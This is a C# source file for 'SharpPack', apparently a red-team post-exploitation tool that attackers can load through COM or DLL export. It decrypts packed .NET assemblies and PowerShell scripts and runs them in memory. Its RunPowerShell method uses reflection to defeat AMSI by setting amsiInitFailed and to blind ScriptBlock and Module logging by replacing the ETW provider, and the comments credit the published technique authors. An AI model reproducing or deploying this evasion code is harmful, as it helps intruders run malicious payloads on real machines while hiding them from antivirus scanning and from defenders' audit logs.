using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.IO;
using System.Text;
using System;
using System.Linq;
using System.Reflection;
using System.Collections.ObjectModel;

namespace SharpPack {

    [ComVisible(true), ClassInterface(ClassInterfaceType.AutoDual)]

    public class SharpPack
    {
        public void RunDotNet(string encpath, string encpass, string outfile, string binname, string arguments)
        {
            Archiver archiver = new Archiver();
            byte[] unpacked = archiver.ArchiveHelper(encpath, encpass, binname);
            DotNetLoader dnl = new DotNetLoader();
            object[] convertedArgs = arguments.Split(' ');
            MemoryStream mem = new MemoryStream(10000);
            StreamWriter writer = new StreamWriter(mem);
            Console.SetOut(writer);
            dnl.loadAssembly(unpacked, convertedArgs);
            writer.Close();
            string s = Encoding.Default.GetString(mem.ToArray());
            mem.Close();
            System.IO.File.WriteAllText(outfile, s.ToString());
        }

        // Following a discussion with cobbr over the implementation this was a much more elegant solution :)
        // Almost directly ripped from https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Execution/Shell.cs#L37-L55
        // Credits to Ryan Cobb

        /// <summary>
        /// Executes specified PowerShell code using System.Management.Automation.dll and bypasses
        /// AMSI, ScriptBlock Logging, and Module Logging (but not Transcription Logging).
        /// </summary>
        /// <param name="PowerShellCode">PowerShell code to execute.</param>
        /// <param name="OutString">Switch. If true, appends Out-String to the PowerShellCode to execute.</param>
        /// <param name="BypassLogging">Switch. If true, bypasses ScriptBlock and Module logging.</param>
        /// <param name="BypassAmsi">Switch. If true, bypasses AMSI.</param>
        /// <returns>Output of executed PowerShell.</returns>
        /// <remarks>
        /// Credit for the AMSI bypass goes to Matt Graeber (@mattifestation). Credit for the ScriptBlock/Module
        /// logging bypass goes to Lee Christensen (@_tifkin).
        /// </remarks>

        public void RunPowerShell(string encpath, string encpass, string outfile, string scriptname, string arguments, bool BypassLogging = true, bool BypassAmsi = true)
        {
            Archiver archiver = new Archiver();
            byte[] unpacked = archiver.ArchiveHelper(encpath, encpass, scriptname);
            string PowerShellCode = System.Text.Encoding.UTF8.GetString(unpacked);
            PowerShellCode += "\n" + arguments;

            System.Windows.Forms.MessageBox.Show(PowerShellCode);

            if (PowerShellCode == null || PowerShellCode == "") return;

            using (PowerShell ps = PowerShell.Create())
            {
                BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
                if (BypassLogging)
                {
                    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                    if (PSEtwLogProvider != null)
                    {
                        var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
                        var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                        EtwProvider.SetValue(null, EventProvider);
                    }
                }
                if (BypassAmsi)
                {
                    var amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                    if (amsiUtils != null)
                    {
                        amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
                    }
                }
                ps.AddScript(PowerShellCode);
                var results = ps.Invoke();
                string output = String.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                System.IO.File.WriteAllText(outfile, output);
            }
        }

        // Old implementation using Runspaces
        /*
        public void RunPsh(string encpath, string encpass, string outfile, string scriptname, string arguments)
        {
            Archiver archiver = new Archiver();
            byte[] unpacked = archiver.ArchiveHelper(encpath, encpass, scriptname);
            string ps1File = System.Text.Encoding.UTF8.GetString(unpacked);
            ps1File += "\n" + arguments;

            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);

            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript(ps1File);

            Collection<PSObject> results = pipeline.Invoke();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.AppendLine(obj.ToString());
            }

            System.IO.File.WriteAllText(outfile, stringBuilder.ToString());
        }*/
    }



    static class UnmanagedExports
    {
        [DllExport("CreateDotNetObject", CallingConvention = CallingConvention.StdCall)]

        [return: MarshalAs(UnmanagedType.IDispatch)]
        static Object CreateDotNetObject()
        {
            return new SharpPack { };
        }
    }
}



